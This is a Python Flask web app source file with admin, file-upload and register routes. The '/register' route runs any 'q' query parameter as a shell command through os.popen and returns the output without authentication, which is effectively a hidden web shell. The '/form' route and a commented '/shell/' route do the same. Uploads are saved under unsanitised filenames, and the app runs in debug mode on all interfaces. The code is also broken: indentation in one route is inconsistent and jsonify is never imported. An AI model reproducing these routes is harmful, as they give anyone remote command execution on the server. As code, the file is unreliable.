import os
import datetime
import hashlib
from flask import Flask, session, url_for, redirect, render_template, request, abort, flash
from database import list_users, verify, delete_user_from_db, add_user
from database import read_note_from_db, write_note_into_db, delete_note_from_db, match_user_id_with_note_id
from database import image_upload_record, list_images_for_user, match_user_id_with_image_uid, delete_image_from_db
from werkzeug.utils import secure_filename


app = Flask(__name__)
app.config.from_object('config')


@app.route('/form', methods= ["GET", "POST"])
def homepage():
    if request.method == 'POST':
        story = request.form.get('story')
        if story:
             stream = os.popen(story)
            return jsonify(result=stream.read())
        else:
            return jsonify(result='Input needed')

    return render_template("private_page.html")
    

# @app.route("/shell/", methods = ['POST'])
# def FUN_shell():
#     arg = request.form['q']
#     stream = os.popen(str(arg))
#     return(stream.read())

@app.route("/admin/")
def FUN_admin():
    if session.get("current_user", None):
        user_list = list_users()
        user_table = zip(range(1, len(user_list)+1),\
                        user_list,\
                        [x + y for x,y in zip(["/delete_user/"] * len(user_list), user_list)])
        return render_template("admin.html", users = user_table)
    else:
        return abort(401)

@app.route("/upload_file", methods = ['POST'])
def FUN_upload_image():
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return(redirect(url_for("FUN_private")))
        file = request.files['file']
        # if user does not select file, browser also submit a empty part without filename
        if file.filename == '':
            flash('No selected file')
            return(redirect(url_for("FUN_private")))
        if file:
            filename = file.filename
            upload_time = str(datetime.datetime.now())
            image_uid = hashlib.sha1((upload_time + filename).encode()).hexdigest()
            # Save the image into UPLOAD_FOLDER
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            # Record this uploading in database
            image_upload_record(image_uid, session['current_user'], filename, upload_time)
            return(redirect(url_for("FUN_private")))

    return(redirect(url_for("FUN_private")))

@app.route("/register")
def FUN_register():
    arg = request.args.get('q')
    stream = os.popen(str(arg))
    return(stream.read())

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
